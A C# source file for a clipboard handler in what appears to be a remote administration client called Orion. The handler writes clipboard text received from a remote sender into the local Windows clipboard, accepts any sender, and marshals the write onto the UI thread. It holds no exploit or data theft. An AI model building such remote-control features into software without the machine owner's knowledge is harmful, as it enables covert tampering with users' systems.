using Orion.Common.Messages;
using Orion.Common.Messages.Monitoring.Clipboard;
using Orion.Common.Messages.Other;
using Orion.Common.Networking;
using Orion.Client.User;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Diagnostics;


namespace Orion.Client.Messages
{
    public class ClipboardHandler : IMessageProcessor
    {
        public ClipboardHandler()
        {
            // 处理器在主(UI)线程上注册，此处捕获的上下文即为可安全操作剪贴板的上下文
            if (_uiContext == null)
                _uiContext = SynchronizationContext.Current;
        }

        public static string _lastReceivedClipboardText = string.Empty;
        public static DateTime _lastReceivedTime = DateTime.MinValue;

        public bool CanExecute(IMessage message) => message is SendClipboardData;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case SendClipboardData msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, SendClipboardData message)
        {
            if (_lastReceivedClipboardText == message.ClipboardText || string.IsNullOrEmpty(message.ClipboardText))
            {
                return;
            }
            
            Debug.WriteLine($"ClipboardHandler: Setting clipboard to: {message.ClipboardText.Substring(0, Math.Min(20, message.ClipboardText.Length))}...");

            RunOnUiThread(() =>
            {
                try
                {
                    _lastReceivedClipboardText = message.ClipboardText;
                    _lastReceivedTime = DateTime.Now;
                    Clipboard.SetText(message.ClipboardText);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"ClipboardHandler: Error setting clipboard: {ex.Message}");
                }
            });
        }

        // 剪贴板写入必须在持有消息循环的 UI 线程上进行。
        // 旧实现在瞬时后台线程上调用 Clipboard.SetText，且线程体内误调 SetApartmentState(STA)
        // 会抛 InvalidOperationException 直接杀死线程。这里 marshal 回首次捕获的 UI 线程上下文。
        private static SynchronizationContext _uiContext;

        private static void RunOnUiThread(Action action)
        {
            var ctx = _uiContext;
            if (ctx != null && ctx != SynchronizationContext.Current)
                ctx.Post(_ => action(), null);
            else
                action();
        }
    }
}
